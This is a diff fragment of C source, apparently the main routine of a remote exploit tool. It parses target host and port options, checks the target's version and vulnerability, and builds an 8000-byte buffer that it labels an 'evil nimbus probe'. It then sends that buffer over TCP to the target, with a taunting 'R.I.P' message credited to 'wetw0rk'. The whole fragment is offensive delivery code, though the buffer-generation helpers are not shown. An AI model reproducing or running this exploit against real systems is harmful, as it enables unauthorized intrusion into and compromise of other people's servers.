+    static struct option long_options[] =
+    {
+      {"help",    no_argument,        0, 'h'},
+      {"target",  required_argument,  0, 't'},
+      {"port",    required_argument,  0, 'p'},
+      {0, 0, 0}
+    };
+
+    int option_index = 0;
+
+    c = getopt_long (argc, argv, "ht:p:", long_options, &option_index);
+
+    if (c == -1)
+      break;
+
+    switch(c)
+    {
+      case 't':
+        rhost = optarg;
+        break;
+      case 'p':
+        port = optarg;
+        break;
+      case 'h':
+      default:
+        help();
+        break;
+    }
+  }
+
+  if (argc < 5)
+    help();
+
+  rport = atoi(port);
+
+  if (check_version(rhost, rport) != 0) {
+    printf("%s Failed to connect to target host\n", PE);
+    exit(-1);
+  }
+
+  if (check_vulnerability(rhost, rport) != 0) {
+    printf("%s Target failed vulnerability tests\n", PE);
+    exit(-1);
+  }
+
+  printf("%s Generating evil nimbus probe, we're watching\n", PI);
+  exploit_buff = generate_exploit_buffer(buffer);
+  memcpy(final_buffer+10, exploit_buff, 8000);
+  probe = packet_gen(exploit, 2, 8000);
+
+  printf("%s Sending evil buffer, R.I.P RIP - wetw0rk\n", PG);
+
+  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    return -1;
+
+  srv.sin_addr.s_addr = inet_addr(rhost);
+  srv.sin_port = htons(rport);
+  srv.sin_family = AF_INET;
+
+  if (connect(sock , (struct sockaddr *)&srv, sizeof(srv)) < 0)
+    return -1;
+
+  send(sock, probe->packet, probe->length, 0);
+
+  free(probe);
+  close(sock);
+}
